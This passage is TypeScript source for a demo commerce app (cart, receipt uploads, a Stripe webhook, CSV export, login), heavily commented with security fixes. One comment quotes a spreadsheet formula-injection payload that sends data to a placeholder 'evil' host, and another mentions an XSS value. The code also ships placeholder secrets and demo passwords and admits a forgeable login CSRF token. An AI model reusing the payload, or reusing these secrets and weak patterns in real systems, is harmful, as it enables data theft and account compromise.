import { randomUUID } from 'node:crypto';

import { createMemoryStorage, form, stripeSignature } from '@kovojs/core';
import {
  createMemoryMutationReplayStore,
  csrfField,
  csrfToken,
  guards,
  i18n,
  metaFromQuery,
  mutation,
  notFound,
  renderComponent,
  renderComponentMutationFailure,
  renderDeferredStream,
  renderMutationEndpointResponse,
  renderMutationFormAttributes,
  renderPageHints,
  renderRoutePageResponse,
  respond,
  route,
  runWebhook,
  s,
  session,
  webhook,
  type GuardResult,
  type MutationFail,
  type StoredFileUpload,
} from '@kovojs/server';
import { escapeAttribute } from '@kovojs/server/internal/html';
import type { MutationWireHeaderSource } from '@kovojs/server/internal/wire';
import {
  authed as betterAuthAuthed,
  betterAuthSession,
  betterAuthSignInEmailMutation,
  betterAuthSignOutMutation,
  role as betterAuthRole,
  type BetterAuthLike,
  type BetterAuthResponseLike,
  type BetterAuthSignInEmailLike,
  type BetterAuthSignOutLike,
} from '@kovojs/better-auth';
import { and, count, eq, sql } from 'drizzle-orm';

import { createCommerceDb, type CommerceDb } from './db.js';
import { attachment, cart, order, product } from './domains.js';
import { CartBadge } from './generated/cart-badge.js';
import { liveTargetRenderers } from './generated/live-targets.js';
import { cartAddDerivedOptimistic } from './generated/optimistic/cart-add.js';
import { OrderHistory } from './generated/order-history.js';
import * as productGridComponent from './generated/product-grid.js';
import { commerceTouchGraph } from './generated/touch-graph.js';
import { commerceStylesheets, createCommerceGraph } from './graph.js';
import { commerceCartPageMeta } from './page-meta.js';
import {
  cartQuery,
  loadCartQuery,
  loadOrderHistory,
  loadProductGrid,
  orderHistoryQuery,
  productGridQuery,
  type CartQueryResult,
  type OrderHistoryResult,
  type ProductGridInput,
  type ProductGridResult,
} from './queries.js';
import { attachments, cartItems, orders, products } from './schema.js';

export { commerceTouchGraph } from './generated/touch-graph.js';
export { commerceStylesheets } from './graph.js';
export { commerceCartPageMeta } from './page-meta.js';
export { createCommerceDb, type CommerceDb } from './db.js';
export { loadCartQuery, loadProductGrid, loadOrderHistory } from './queries.js';
export type {
  CartQueryResult,
  OrderHistoryResult,
  ProductGridInput,
  ProductGridResult,
} from './queries.js';

export type CommerceRole = 'admin' | 'member';

export interface CommerceRenderFaults {
  productGrid?: () => Error;
}

export interface CommerceSession {
  id: string;
  user: {
    id: string;
    roles?: readonly CommerceRole[];
  };
}

export interface CommerceRequest {
  db: CommerceDb;
  renderFaults?: CommerceRenderFaults;
  session?: CommerceSession | null;
}

export interface CommerceAuthRequest extends CommerceRequest {
  authCsrfId?: string | null;
  headers: Headers;
}

export interface CommerceBetterAuthSession {
  id: string;
}

export interface CommerceBetterAuthUser {
  email: string;
  id: string;
  roles: readonly CommerceRole[];
}

export type CommerceBetterAuth = BetterAuthLike<CommerceBetterAuthSession, CommerceBetterAuthUser> &
  BetterAuthSignInEmailLike &
  BetterAuthSignOutLike;

export interface CommerceLoginFailureState {
  code: 'INVALID_CREDENTIALS';
}

export const commerceSession = session(
  s.object({
    id: s.string(),
    user: s.object({
      id: s.string(),
    }),
  }),
);

export const EXAMPLE_ONLY_COMMERCE_CSRF_SECRET = 'EXAMPLE_ONLY_COMMERCE_CSRF_SECRET';
export const EXAMPLE_ONLY_COMMERCE_AUTH_CSRF_SECRET = 'EXAMPLE_ONLY_COMMERCE_AUTH_CSRF_SECRET';

export const commerceCsrf = {
  field: 'csrf',
  secret: EXAMPLE_ONLY_COMMERCE_CSRF_SECRET,
  sessionId(request: CommerceRequest) {
    return request.session?.id;
  },
};

export const commerceAuthCsrf = {
  field: 'csrf',
  secret: EXAMPLE_ONLY_COMMERCE_AUTH_CSRF_SECRET,
  sessionId(request: CommerceAuthRequest) {
    return request.session?.id ?? request.authCsrfId ?? undefined;
  },
};

const commerceAuthCookieName = 'kovo_commerce_session';

const commerceAuthUsers = new Map<
  string,
  CommerceBetterAuthUser & { name: string; password: string }
>([
  [
    'ada@example.com',
    {
      email: 'ada@example.com',
      id: 'u1',
      name: 'Ada Lovelace',
      password: 'correct',
      roles: ['admin', 'member'],
    },
  ],
  [
    'grace@example.com',
    {
      email: 'grace@example.com',
      id: 'u2',
      name: 'Grace Hopper',
      password: 'correct',
      roles: ['member'],
    },
  ],
]);

// SECURITY (SECURITY_FINDINGS.md M9): the set of valid order owners. The commerce
// demo's user directory is the in-memory `commerceAuthUsers` map (there is no users
// table), so the payment webhook validates the body `userId` against these known
// ids rather than trusting an arbitrary attacker-supplied value. Production must
// instead resolve the owner from verified provider metadata.
export function commerceKnownUserIds(): ReadonlySet<string> {
  return new Set([...commerceAuthUsers.values()].map((user) => user.id));
}

export function createCommerceBetterAuth(): CommerceBetterAuth {
  const sessionUserIds = new Map<string, string>();

  return {
    api: {
      getSession(options) {
        const token = readCookie(options.headers, commerceAuthCookieName);
        const userId = token ? sessionUserIds.get(token) : undefined;
        const user = userId
          ? [...commerceAuthUsers.values()].find((candidate) => candidate.id === userId)
          : undefined;

        if (!token || !user) return null;

        return {
          session: { id: token },
          user: {
            email: user.email,
            id: user.id,
            roles: user.roles,
          },
        };
      },
      signInEmail(options) {
        const user = commerceAuthUsers.get(options.body.email);
        if (!user || user.password !== options.body.password) {
          return commerceAuthResponse([], 401);
        }

        const token = `session-${user.id}`;
        sessionUserIds.set(token, user.id);

        return commerceAuthResponse([
          `${commerceAuthCookieName}=${token}; Path=/; HttpOnly; SameSite=Lax`,
        ]);
      },
      signOut(options) {
        const token = readCookie(options.headers, commerceAuthCookieName);
        if (token) sessionUserIds.delete(token);

        return commerceAuthResponse([
          `${commerceAuthCookieName}=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax`,
        ]);
      },
    },
  };
}

export const commerceBetterAuth = createCommerceBetterAuth();

export const commerceSessionProvider = commerceSession.provider(
  betterAuthSession<
    CommerceBetterAuthSession,
    CommerceBetterAuthUser,
    CommerceSession,
    CommerceAuthRequest
  >(commerceBetterAuth, ({ session: authSession, user }) => ({
    id: authSession.id,
    user: {
      id: user.id,
      roles: user.roles,
    },
  })),
);

export const commerceAdminGuard = betterAuthRole<CommerceAuthRequest>('admin');

// SECURITY (SECURITY_FINDINGS.md M7): the sign-in mutation must throttle attempts to
// blunt online password brute-force / credential stuffing. We key by a per-client
// identifier derived from request headers with `per:'global'` rather than the default
// `per:'session'`, because there is no session yet on a login attempt and the default
// keying collapses every unauthenticated request into a single shared `'anonymous'`
// bucket (which would let one attacker exhaust the limit and lock out all users).
// Guards only receive the request (not the parsed input), so the submitted email is
// not available here; production should key by client IP (e.g. the upstream proxy's
// `X-Forwarded-For`). We also enforce a same-origin check (M6) ahead of the throttle.
function commerceSignInClientKey(request: { headers?: Headers }): string {
  const headers = request.headers;
  const forwarded =
    headers?.get('x-forwarded-for')?.split(',')[0]?.trim() ||
    headers?.get('x-real-ip')?.trim() ||
    headers?.get('user-agent')?.trim() ||
    'unknown-client';
  return `signin:${forwarded}`;
}

// SECURITY (SECURITY_FINDINGS.md M6): the pre-session login CSRF token is derived from
// a process-wide constant (`authCsrfId`) and a shipped example secret, so the token
// `HMAC(static_secret, constant)` is forgeable offline — enabling login CSRF. Full
// per-browser pre-session-cookie wiring is too invasive for this shell structure
// (route pages return strings and cannot set a cookie on the login GET, and guards
// only receive the request — not a response to set cookies on), so we add an
// Origin / Sec-Fetch-Site same-origin check to the unauthenticated sign-in mutation.
//
// RESIDUAL LIMITATION: this defends against cross-site form posts from browsers that
// send `Origin` / `Sec-Fetch-Site` (all current browsers do for cross-origin POSTs).
// It does NOT defend against a non-browser client that omits both headers, and the
// underlying constant-token weakness remains. A production app should ALSO bind the
// pre-session token to a per-browser random value (random pre-session cookie used as
// the csrf `sessionId` source) so the synchronizer token is unforgeable.
function commerceSignInSameOriginGuard<Request extends { headers?: Headers; url?: string }>(): (
  request: Request,
) => GuardResult {
  return (request: Request) => {
    const headers = request.headers;
    if (!headers) return true;

    const secFetchSite = headers.get('sec-fetch-site');
    if (secFetchSite) {
      // `same-origin`/`same-site`/`none` (direct navigation) are accepted; only an
      // explicit `cross-site` is a cross-origin form post we must reject.
      return secFetchSite === 'cross-site' ? sameOriginGuardFailure() : true;
    }

    const origin = headers.get('origin');
    if (!origin) return true; // No Origin header (e.g. same-origin GET-then-POST in older browsers, server-side calls).

    const selfHost = sameOriginHost(request);
    if (!selfHost) return true; // Cannot determine our own host (e.g. test harness request without a URL); fail open rather than break legitimate flows.

    let originHost: string;
    try {
      originHost = new URL(origin).host;
    } catch {
      return sameOriginGuardFailure();
    }

    return originHost === selfHost ? true : sameOriginGuardFailure();
  };
}

function sameOriginHost(request: { headers?: Headers; url?: string }): string | undefined {
  const host = request.headers?.get('host');
  if (host) return host;
  if (request.url) {
    try {
      return new URL(request.url).host;
    } catch {
      return undefined;
    }
  }
  return undefined;
}

function sameOriginGuardFailure(): GuardResult {
  // SPEC §6.5: a cross-origin sign-in POST is rejected as forbidden (the framework
  // maps `forbidden` to the §9.2 typed-error path on mutations, wire code UNAUTHORIZED).
  return {
    kind: 'forbidden',
    payload: { reason: 'cross-origin sign-in rejected' },
  };
}

export const commerceSignIn = betterAuthSignInEmailMutation<'auth/sign-in', CommerceAuthRequest>(
  commerceBetterAuth,
  {
    csrf: commerceAuthCsrf,
    defaultRedirectTo: '/cart',
    guard: guards.all<CommerceAuthRequest>(
      commerceSignInSameOriginGuard<CommerceAuthRequest>(),
      guards.rateLimit<CommerceAuthRequest>({
        key: commerceSignInClientKey,
        max: 5,
        per: 'global',
        windowMs: 60_000,
      }),
    ),
  },
);

export const commerceSignOut = betterAuthSignOutMutation<
  'auth/sign-out',
  CommerceAuthRequest,
  CommerceAuthRequest & { session: CommerceSession }
>(commerceBetterAuth, {
  csrf: commerceAuthCsrf,
  defaultRedirectTo: '/login',
  guard: betterAuthAuthed<CommerceAuthRequest>(),
});

export { attachment, cart, order, product, cartQuery, orderHistoryQuery, productGridQuery };

export type AddToCartInput = {
  productId: string;
  quantity: number;
};

export const addToCartForm = form<'cart/add', AddToCartInput>('cart/add');

export interface UploadReceiptInput {
  orderId: string;
  receipt: StoredFileUpload;
}

export interface PaymentWebhookInput {
  data: {
    object: {
      id: string;
      productId: string;
      quantity: number;
      total: number;
      userId: string;
    };
  };
  id: string;
  type: string;
}

export const commerceAttachmentStorage = createMemoryStorage();

// SECURITY (SECURITY_FINDINGS.md M9): the webhook signing secret must come from the
// environment and the app must fail closed when it is unset, so a deployment can
// never silently ship with a public, repo-readable HMAC key (which would let anyone
// reading this repo forge a valid signature and POST attacker-chosen orders). The
// `EXAMPLE_ONLY_*` literal is a documented placeholder used only by the test suite /
// local demo; production must set `COMMERCE_WEBHOOK_SECRET`.
export const EXAMPLE_ONLY_COMMERCE_PAYMENT_WEBHOOK_SECRET = 'whsec_commerce_reference_app';

export function resolveCommercePaymentWebhookSecret(
  env: Record<string, string | undefined> = process.env,
): string {
  const secret = env.COMMERCE_WEBHOOK_SECRET;
  if (secret && secret.length > 0) return secret;

  // Fail closed in production; only the local demo / tests fall back to the
  // documented EXAMPLE_ONLY_* placeholder.
  if (env.NODE_ENV === 'production') {
    throw new Error(
      'COMMERCE_WEBHOOK_SECRET must be set in production; refusing to start with a known placeholder webhook secret.',
    );
  }

  return EXAMPLE_ONLY_COMMERCE_PAYMENT_WEBHOOK_SECRET;
}

export const commercePaymentWebhookSecret = resolveCommercePaymentWebhookSecret();
export const commercePaymentReplayStore = createMemoryMutationReplayStore();

export interface AddToCartFailureState {
  failure: MutationFail<string, unknown>;
  productId?: string;
}

export const addToCart = mutation('cart/add', {
  csrf: commerceCsrf,
  errors: {
    OUT_OF_STOCK: s.object({ availableQuantity: s.number().int().min(0) }),
  },
  input: s.object({
    productId: s.string(),
    quantity: s.number().int().min(1).default(1),
  }),
  guard: guards.all(
    betterAuthAuthed<CommerceRequest>(),
    guards.rateLimit<CommerceRequest>({ max: 10, per: 'session' }),
  ),
  registry: {
    inferredTouches: commerceTouchGraph['cart.addItem'].touches,
    queries: [cartQuery, productGridQuery, orderHistoryQuery],
  },
  transaction(request: CommerceRequest, run) {
    return request.db.transaction((tx) => run({ ...request, db: tx as unknown as CommerceDb }));
  },
  // SPEC.md §10.5 Stage 1: the static extractor lowers these real Drizzle writes
  // into the symbolic effect IR (insert cart_items{qty}, insert orders{…}, update
  // products SET stock = stock - quantity WHERE id = productId). Destructuring the
  // input binds `productId`/`quantity` to `$input` paths; `const db = request.db`
  // is the proven Drizzle receiver the write extractor follows.
  async handler({ productId, quantity }, request: CommerceRequest, context) {
    const currentSession = commerceSession.parse(request);
    const db = request.db;
    const found = (await db.select().from(products).where(eq(products.id, productId)).limit(1))[0];
    if (!found || found.stock < quantity) {
      return context.fail('OUT_OF_STOCK', { availableQuantity: found?.stock ?? 0 });
    }

    const existingOrders = await db.select({ value: count() }).from(orders);
    const orderId = `order-${Number(existingOrders[0]?.value ?? 0) + 1}`;

    await db.insert(cartItems).values({
      productId: productId,
      qty: quantity,
      unitPrice: found.unitPrice,
    });
    await db.insert(orders).values({
      id: orderId,
      productId: productId,
      qty: quantity,
      total: found.unitPrice * quantity,
      userId: currentSession.user.id,
    });
    await db
      .update(products)
      .set({ stock: sql`${products.stock} - ${quantity}` })
      .where(eq(products.id, productId));
    return { productId: productId, quantity: quantity };
  },
});

// SPEC.md §10.4/§10.5: optimism for cart/add is now compiler-DERIVED. The
// generated/optimistic/cart-add.ts transforms (count += quantity, push the new
// order row with placeholders, decrement the matched product's stock) supersede
// the previously hand-written `cart` transform and the `await-fragment` punts on
// orderHistory/productGrid. Deleting a transform there lets you hand-write an
// override; regenerating restores derivation (the §10.4 pair-by-pair contract).
export const addToCartOptimistic = cartAddDerivedOptimistic;

// SECURITY (SECURITY_FINDINGS.md M8): the receipt storage key must never derive
// solely from the client-supplied filename. A shared `receipts/${file.name}` key
// lets two users uploading the same filename collide — the later upload overwrites
// the earlier user's blob, and the download route (which streams whatever bytes
// live at the row's stored key) then serves one user's bytes to another.
//
// We namespace every upload with a server-generated, unguessable random id and
// sanitize the trailing filename segment so distinct uploads can never collide and
// one user's bytes can never land under another user's key. The `store({ key })`
// callback only receives the `FileLike` (name/size/type) — it has no access to the
// session — so the random id (not the session user id) is what guarantees
// isolation; the unguessable prefix also prevents key-guessing IDOR. The DB row
// persists this exact key (`input.receipt.key`), so the download route's
// row -> blob lookup stays consistent.
function sanitizeReceiptFilename(name: string): string {
  // Strip any path separators (`/`, `\`) and parent-dir traversal so the trailing
  // segment can never escape the namespaced prefix; fall back to a stable default.
  const base = name.split(/[\\/]/).pop() ?? '';
  const cleaned = base.replace(/[^A-Za-z0-9._-]/g, '_').replace(/^\.+/, '');
  return cleaned.length > 0 ? cleaned : 'receipt';
}

function receiptStorageKey(file: { name: string }): string {
  return `receipts/${randomUUID()}/${sanitizeReceiptFilename(file.name)}`;
}

export const uploadReceipt = mutation('order/receipt', {
  input: s.object({
    orderId: s.string(),
    receipt: s.file({ maxBytes: 64 * 1024, mime: ['application/pdf', 'image/png'] }).store({
      key: (file) => receiptStorageKey(file),
      metadata: (file) => ({ filename: file.name }),
      storage: commerceAttachmentStorage,
    }),
  }),
  guard: guards.all(
    betterAuthAuthed<CommerceRequest>(),
    guards.rateLimit<CommerceRequest>({ max: 5, per: 'session' }),
  ),
  registry: {
    inferredTouches: commerceTouchGraph['order.receipt'].touches,
    queries: [cartQuery, productGridQuery, orderHistoryQuery],
  },
  async handler(input: UploadReceiptInput, request: CommerceRequest) {
    const currentSession = commerceSession.parse(request);
    const db = request.db;
    const existing = await db.select({ value: count() }).from(attachments);
    const attachmentId = `attachment-${Number(existing[0]?.value ?? 0) + 1}`;

    await db.insert(attachments).values({
      contentType: input.receipt.storage.contentType ?? input.receipt.file.type,
      filename: input.receipt.file.name,
      id: attachmentId,
      orderId: input.orderId,
      size: input.receipt.storage.size,
      storageKey: input.receipt.key,
      userId: currentSession.user.id,
    });

    return {
      attachmentId,
      fileName: input.receipt.file.name,
      orderId: input.orderId,
      size: input.receipt.storage.size,
      uploadedBy: currentSession.user.id,
    };
  },
});

export const paymentWebhook = webhook('payment/stripe', {
  path: '/webhooks/stripe',
  verify: stripeSignature({ secret: commercePaymentWebhookSecret }),
  input: s.object({
    data: s.object({
      object: s.object({
        id: s.string(),
        productId: s.string(),
        quantity: s.number().int().min(1),
        total: s.number().int().min(0),
        userId: s.string(),
      }),
    }),
    id: s.string(),
    type: s.string(),
  }),
  idempotency: (input) => input.id,
  replayStore: commercePaymentReplayStore,
  transaction(context, run) {
    const request = context.request as Request & { db?: CommerceDb };
    if (!request.db) throw new Error('commerce payment webhook requires db on request');
    return request.db.transaction((tx) => run(tx as unknown as CommerceDb));
  },
  async handler(input: PaymentWebhookInput, context) {
    if (input.type !== 'checkout.session.completed') {
      return context.fail('IGNORED_EVENT', { type: input.type }, { status: 422 });
    }

    const paid = input.data.object;
    const tx = context.tx as CommerceDb;

    // SECURITY (SECURITY_FINDINGS.md M9): never trust attacker-chosen `productId` /
    // `userId` straight from the webhook body. A signed-event sender otherwise picks
    // both the product and the victim account the order lands on.
    //
    // (1) Reject the event if `productId` is not a real catalog row, so a poisoned
    //     id (e.g. `=HYPERLINK(...)` / `<img onerror=...>`) can never be persisted
    //     and then fan out into the order-history HTML / CSV export sinks.
    const product = (
      await tx
        .select({ id: products.id })
        .from(products)
        .where(eq(products.id, paid.productId))
        .limit(1)
    )[0];
    if (!product) {
      return context.fail('UNKNOWN_PRODUCT', { productId: paid.productId }, { status: 422 });
    }

    // (2) Resolve the order owner against an existing user. The commerce demo has no
    //     real Stripe customer -> user mapping, so at minimum we require that the
    //     body `userId` corresponds to a known user and never blindly trust an
    //     arbitrary value. PRODUCTION MUST bind the owner to VERIFIED provider
    //     metadata (e.g. the Stripe customer id resolved from the verified event /
    //     a customers table), NOT to a client-chosen `userId` in the event body.
    if (!commerceKnownUserIds().has(paid.userId)) {
      return context.fail('UNKNOWN_USER', { userId: paid.userId }, { status: 422 });
    }

    await tx.insert(orders).values({
      id: paid.id,
      productId: paid.productId,
      qty: paid.quantity,
      total: paid.total,
      userId: paid.userId,
    });
    context.recordChange(order, {
      input: { eventId: input.id, orderId: paid.id },
      keys: [paid.id],
      reason: 'payment webhook',
    });

    return { orderId: paid.id };
  },
});

export const orderCsvRoute = route('/exports/orders.csv', {
  guard: betterAuthAuthed<CommerceRequest>(),
  async page(_context, request) {
    // SECURITY (SECURITY_FINDINGS.md M9): scope the export to the authenticated
    // user at the SOURCE read (not just the in-stream filter), so the CSV only
    // ever contains the requester's own orders.
    const userId = request.session.user.id;
    const ownOrders = await loadOrdersForCsv(request.db, userId);
    return respond.stream(ordersCsvStream(ownOrders, userId), {
      contentType: 'text/csv; charset=utf-8',
      etag: `"orders-${ownOrders.length}"`,
      filename: 'orders.csv',
    });
  },
});

export const attachmentDownloadRoute = route('/attachments/:id', {
  guard: betterAuthAuthed<CommerceRequest>(),
  async page(context, request) {
    const db = request.db;
    const found = (
      await db
        .select()
        .from(attachments)
        .where(
          and(
            eq(attachments.id, context.params.id),
            eq(attachments.userId, request.session.user.id),
          ),
        )
        .limit(1)
    )[0];
    if (!found) return notFound();

    const stored = await commerceAttachmentStorage.stream(found.storageKey);
    if (!stored) return notFound();

    return respond.stream(stored.body, {
      contentType: found.contentType,
      disposition: 'inline',
      filename: found.filename,
      ...(stored.etag ? { etag: stored.etag } : {}),
    });
  },
});

export const commerceAdminRoute = route('/admin', {
  guard: commerceAdminGuard,
  page(_context, request: CommerceAuthRequest) {
    const currentSession = commerceSession.parse(request);
    return `admin:${currentSession.user.id}${renderCommerceLogoutForm(request)}`;
  },
});

export function renderOrderCsvRoute(request: CommerceRequest) {
  return renderRoutePageResponse(orderCsvRoute, {}, request);
}

export function renderAttachmentDownloadRoute(
  db: CommerceDb,
  id: string,
  request: CommerceRequest,
) {
  return renderRoutePageResponse(attachmentDownloadRoute, { params: { id } }, { ...request, db });
}

export function runPaymentWebhook(request: Request & { db?: CommerceDb }) {
  return runWebhook(paymentWebhook, request);
}

export function renderCommerceAdminRoute(request: CommerceAuthRequest) {
  return renderRoutePageResponse(
    commerceAdminRoute,
    {},
    request,
    (value) => `<main>${value}</main>`,
    {
      loginPath: '/login',
      renderForbidden: () => '<main>Forbidden</main>',
      sessionProvider: commerceSessionProvider,
    },
  );
}

export const commerceMessageCatalog = {
  cartLabel: 'Cart',
  productStock: '{count} in stock',
} as const;

export const commerceMessages = i18n('en-US', commerceMessageCatalog);

export const commerceMeta = metaFromQuery(cartQuery, commerceCartPageMeta);

// The product grid (cards, no-JS add-to-cart forms, failure output) is
// authored as a TSX component in src/components/product-grid.tsx and compiled
// through @kovojs/compiler (SPEC.md sections 3, 4.1, 5.2); the app imports its
// committed lowered IR from src/generated/. Bound via a namespace import so
// the import block stays one line: the committed touch graph pins the
// mutation handlers' write-site line numbers in this file.
export const {
  ProductGrid,
  renderAddToCartError,
  renderAddToCartForm,
  renderAddToCartMutationFailureError,
  renderAddToCartMutationFailureForm,
  renderProductGridItems,
} = productGridComponent;
export type AddToCartFailure = productGridComponent.AddToCartFailure;

export function renderProductGrid(
  result: ProductGridResult,
  request?: CommerceRequest,
  addToCartFailure?: AddToCartFailureState,
  options: { readOnly?: boolean | undefined } = {},
): string {
  // SPEC.md section 4.2: the markup comes from the compiled TSX component;
  // kovo-c and kovo-deps are compiler-derived (section 4.8). SPEC.md §6.3/§9.2
  // keeps mutation failures in forms.addToCart.failure, separate from query data.
  const slots = productGridRenderSlots(request, options, addToCartFailure?.productId);

  if (addToCartFailure) {
    return renderComponentMutationFailure(
      ProductGrid,
      { productGrid: result },
      addToCartFailure.failure,
      {
        formName: 'addToCart',
        slots,
      },
    );
  }

  return renderComponent(ProductGrid, { productGrid: result }, { slots });
}

function productGridRenderSlots(
  request?: CommerceRequest,
  options: { readOnly?: boolean | undefined } = {},
  productId?: string,
): productGridComponent.ProductGridRenderSlots {
  return {
    forms: { addToCart: { failure: null } },
    ...(productId === undefined ? {} : { productId }),
    ...(options.readOnly === undefined ? {} : { readOnly: options.readOnly }),
    ...(request === undefined ? {} : { request }),
  };
}

export function renderProductGridAppend(
  result: ProductGridResult,
  request?: CommerceRequest,
): string {
  return renderProductGridItems(result, undefined, null, request);
}

export async function renderProductGridPageFragment(
  db: CommerceDb,
  input: ProductGridInput = {},
): Promise<string> {
  return `<kovo-fragment target="product-grid" mode="append">${renderProductGridAppend(await loadProductGrid(db, input))}</kovo-fragment>`;
}

export async function renderProductGridDeferredStream(
  db: CommerceDb,
  input: ProductGridInput = {},
) {
  const productGrid = await loadProductGrid(db, input);

  return renderDeferredStream({
    closeHtml: '</main></body></html>',
    chunks: [
      {
        fragments: [
          {
            html: renderProductGrid(productGrid),
            stylesheets: commerceStylesheets,
            target: 'product-grid',
          },
        ],
        queries: [{ name: 'productGrid', value: productGrid }],
      },
    ],
    shell:
      '<!doctype html><html><body><main class="min-h-dvh bg-slate-50 p-6"><kovo-defer target="product-grid" state="pending"></kovo-defer>',
  });
}

export async function renderOrderHistory(db: CommerceDb, userId?: string): Promise<string> {
  // SPEC.md section 4.2: the markup comes from the compiled TSX component
  // (src/components/order-history.tsx); kovo-c and kovo-deps are compiler-derived.
  // SECURITY (SECURITY_FINDINGS.md M9): order history is per-user. With no
  // authenticated user (e.g. the read-only static export, or an unauthenticated
  // viewer) we default-deny and render an EMPTY history rather than leaking every
  // user's orders. When a user id is present we scope the read to that user.
  const history: OrderHistoryResult = userId ? await loadOrderHistory(db, userId) : { items: [] };
  return OrderHistory.definition.render({ orderHistory: history });
}

export function renderReceiptUploadForm(orderId = 'order-1'): string {
  return [
    `<form ${renderMutationFormAttributes(uploadReceipt)} enctype="multipart/form-data" kovo-deps="order" class="mt-4 grid gap-2 rounded border border-slate-200 bg-white p-4" aria-busy="false">`,
    `<input type="hidden" name="orderId" value="${escapeAttribute(orderId)}">`,
    '<label class="grid gap-1 text-sm font-medium text-slate-700"><span>Receipt</span>',
    '<input name="receipt" type="file" accept="application/pdf,image/png" class="rounded border border-slate-300 px-2 py-1">',
    '</label>',
    '<progress kovo-upload-progress value="0" max="100" class="h-2 w-full" aria-label="Receipt upload progress"></progress>',
    '<button class="rounded bg-slate-900 px-3 py-2 text-sm font-medium text-white" type="submit">Upload receipt</button>',
    '</form>',
  ].join('');
}

async function loadOrdersForCsv(
  db: CommerceDb,
  userId: string,
): Promise<OrderHistoryResult['items']> {
  return (await loadOrderHistory(db, userId)).items;
}

function ordersCsvStream(
  orders: OrderHistoryResult['items'],
  userId: string,
): ReadableStream<Uint8Array> {
  const lines = [
    'id,productId,qty,total,userId',
    ...orders
      .filter((order) => order.userId === userId)
      .map((order) =>
        [order.id, order.productId, String(order.qty), String(order.total), order.userId]
          .map(csvCell)
          .join(','),
      ),
    '',
  ];
  const body = new TextEncoder().encode(lines.join('\n'));

  return new ReadableStream<Uint8Array>({
    start(controller) {
      controller.enqueue(body);
      controller.close();
    },
  });
}

// SECURITY (SECURITY_FINDINGS.md M9): RFC-4180 quoting alone does NOT neutralize
// CSV/spreadsheet formula injection. A cell beginning with `= + - @`, TAB, or CR is
// interpreted as a live formula by Excel / Google Sheets, so a poisoned value such
// as `=HYPERLINK("http://evil/?"&A1)` would execute / exfiltrate when a user opens
// the exported `orders.csv`. We defang any such cell by prefixing a single quote
// (`'`) BEFORE applying the RFC-4180 quoting below, which forces the spreadsheet to
// treat the content as literal text.
function csvCell(value: string): string {
  const defanged = /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
  return /[",\n\r]/.test(defanged) ? `"${defanged.replaceAll('"', '""')}"` : defanged;
}

// CartBadge and OrderHistory are authored as TSX components under
// src/components/ and compiled through @kovojs/compiler (SPEC.md sections 3,
// 4.1, 5.2); the app imports their committed lowered IR from src/generated/.
export { CartBadge, OrderHistory };

export function renderCommercePageHints(cart: CartQueryResult = { count: 0 }) {
  return renderPageHints(
    {
      i18n: commerceMessages,
      meta: commerceMeta,
      stylesheets: commerceStylesheets,
    },
    { queries: { cart } },
  );
}

export const commercePageHints = renderCommercePageHints();

export async function renderCartPage(
  db = createCommerceDb(),
  addToCartFailure?: AddToCartFailureState,
  request?: CommerceRequest,
): Promise<string> {
  const pageHints = renderCommercePageHints(await loadCartQuery(db));
  return `<html><head>${pageHints.html}</head><body class="min-h-dvh bg-slate-50 p-6">${await renderCartPageBody(db, addToCartFailure, request)}</body></html>`;
}

export async function renderCartPageBody(
  db = createCommerceDb(),
  addToCartFailure?: AddToCartFailureState,
  request?: CommerceRequest,
  options: { readOnly?: boolean | undefined } = {},
): Promise<string> {
  const cartBadge = CartBadge.definition.render({ cart: await loadCartQuery(db) });
  const productGrid = renderProductGrid(
    await loadProductGridForRequest(db, undefined, request),
    request,
    addToCartFailure,
    { readOnly: options.readOnly },
  );
  const receiptForm = options.readOnly ? '' : renderReceiptUploadForm();
  // SECURITY (SECURITY_FINDINGS.md M9): scope order history to the session user.
  const orderHistory = await renderOrderHistory(db, request?.session?.user?.id);
  return `<main class="mx-auto max-w-4xl"><kovo-fragment target="cart-badge">${cartBadge}</kovo-fragment><kovo-fragment target="product-grid">${productGrid}</kovo-fragment><kovo-fragment target="order-history">${orderHistory}${receiptForm}</kovo-fragment></main>`;
}

export function submitAddToCartNoJs(rawInput: unknown, request: CommerceRequest) {
  return submitAddToCart(rawInput, request, {});
}

export function submitAddToCart(
  rawInput: unknown,
  request: CommerceRequest,
  headers: MutationWireHeaderSource,
) {
  const productId = productIdFromRawInput(rawInput);
  const submittedInput = appendCommerceCsrf(rawInput, request);
  return renderMutationEndpointResponse(addToCart, {
    csrf: commerceCsrf,
    failureStylesheets: commerceStylesheets,
    headers,
    liveTargetRenderers,
    rawInput: submittedInput,
    redirectTo: '/cart',
    renderFailureFragment: (failure) =>
      renderAddToCartFailureFragment(request.db, rawInput, failure, request),
    renderFailurePage: (failure) =>
      renderCartPage(
        request.db,
        {
          failure,
          ...(productId ? { productId } : {}),
        },
        request,
      ),
    request,
  });
}

async function loadProductForFailure(
  db: CommerceDb,
  productId: string,
): Promise<{ id: string; stock: number; unitPrice: number } | undefined> {
  return (await db.select().from(products).where(eq(products.id, productId)).limit(1))[0];
}

export function renderCommerceLoginForm(
  request: CommerceAuthRequest,
  options: { failure?: CommerceLoginFailureState; next?: string } = {},
): string {
  return [
    `<form ${renderMutationFormAttributes(commerceSignIn)} class="grid gap-4 rounded border border-slate-200 bg-white p-6">`,
    csrfField(request, commerceAuthCsrf),
    `<input type="hidden" name="next" value="${escapeAttribute(options.next ?? '/cart')}">`,
    '<label class="grid gap-1 text-sm font-medium text-slate-700"><span>Email</span>',
    '<input class="rounded border border-slate-300 px-3 py-2" name="email" type="email" autocomplete="email" required>',
    '</label>',
    '<label class="grid gap-1 text-sm font-medium text-slate-700"><span>Password</span>',
    '<input class="rounded border border-slate-300 px-3 py-2" name="password" type="password" autocomplete="current-password" required>',
    '</label>',
    options.failure?.code === 'INVALID_CREDENTIALS'
      ? '<output role="alert" data-error-code="INVALID_CREDENTIALS" class="text-sm text-red-700">Invalid email or password.</output>'
      : '',
    '<button class="rounded bg-slate-900 px-4 py-2 text-sm font-medium text-white" type="submit">Sign in</button>',
    '</form>',
  ].join('');
}

export function renderCommerceLogoutForm(request: CommerceAuthRequest): string {
  return [
    `<form ${renderMutationFormAttributes(commerceSignOut)} class="inline">`,
    csrfField(request, commerceAuthCsrf),
    '<button class="text-sm font-medium text-slate-900" type="submit">Sign out</button>',
    '</form>',
  ].join('');
}

export function submitCommerceSignInNoJs(rawInput: unknown, request: CommerceAuthRequest) {
  const next = nextFromRawInput(rawInput);

  return renderMutationEndpointResponse(commerceSignIn, {
    csrf: commerceAuthCsrf,
    headers: {},
    rawInput,
    redirectTo: (result) => result.value.redirectTo,
